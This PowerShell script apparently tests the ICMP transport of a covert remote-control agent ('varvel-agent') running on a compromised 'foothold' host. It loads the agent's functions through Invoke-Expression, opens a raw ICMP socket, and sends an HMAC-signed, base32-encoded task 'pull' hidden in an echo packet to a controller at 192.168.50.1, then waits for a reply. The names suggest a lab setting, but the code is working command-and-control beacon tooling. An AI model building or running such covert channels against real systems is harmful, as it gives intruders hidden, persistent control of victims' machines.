# guest-icmp-agenttest.ps1 - loads the CURRENT agent transport code (patched
# Connect-Icmp with RCVALL) and replicates one real pull for a fresh identity with a
# task waiting. Prints any Connect-Icmp fallback/RCVALL warnings (they go to stdout,
# which the foothold captures) plus the verdict. PURE ASCII ONLY.
param(
  [string]$AgentFile = 'C:\Windows\System32\agentbox\varvel-agent.ps1',
  [string]$AgentId = 'probe000000',
  [string]$Token = '00',
  [string]$Dst = '192.168.50.1'
)
$ErrorActionPreference = 'Stop'
$tokens = $null; $errors = $null
$ast = [System.Management.Automation.Language.Parser]::ParseFile($AgentFile, [ref]$tokens, [ref]$errors)
if ($errors.Count) { Write-Host 'AGENTFILE-PARSE-FAIL'; exit 1 }
$want = @('Get-InetChecksum', 'Get-IcmpPacket', 'Connect-Icmp', 'Get-HmacHex', 'Get-EncodedQuery', 'ConvertTo-B32', 'Read-IcmpPacket', 'Receive-IcmpFrame')
$fns = $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)
$found = @()
foreach ($f in $fns) { if ($want -contains $f.Name) { Invoke-Expression $f.Extent.Text; $found += $f.Name } }
foreach ($w in $want) { if (-not ($found -contains $w)) { Write-Host "MISSING-FN: $w"; exit 1 } }
$B32_CHARS = '0123456789abcdefghijklmnopqrstuv'
$script:Seq = 0
$Url = "icmp://$Dst"
try { Connect-Icmp } catch { Write-Host ('SOCK-FAIL: ' + $_.Exception.Message); exit 1 }
$script:Seq = 1
$h = Get-HmacHex $Token ($AgentId + ':1:pull')
$q = Get-EncodedQuery ([ordered]@{ a = $AgentId; s = 1; h = $h }) 'ax.sim'
$pkt = Get-IcmpPacket 0 1 1 0 1 ([Text.Encoding]::UTF8.GetBytes($q))
try { [void]$script:IcmpSock.SendTo($pkt, $script:IcmpEndPoint) } catch { Write-Host ('SEND-FAIL: ' + $_.Exception.Message); exit 1 }
$sw = [Diagnostics.Stopwatch]::StartNew()
$seen = 0; $types = @()
while ($sw.ElapsedMilliseconds -lt 10000) {
  $f = Receive-IcmpFrame
  if ($null -eq $f) { continue }
  $seen++
  if ($types -notcontains $f.type) { $types += $f.type }
  if ($f.kind -eq 'reply' -and $f.seq -eq 1) { Write-Host ('REPLY-OK dlen=' + $f.data.Length + ' seen=' + $seen); exit 0 }
}
Write-Host ('NO-REPLY seen=' + $seen + ' types=' + ($types -join ','))
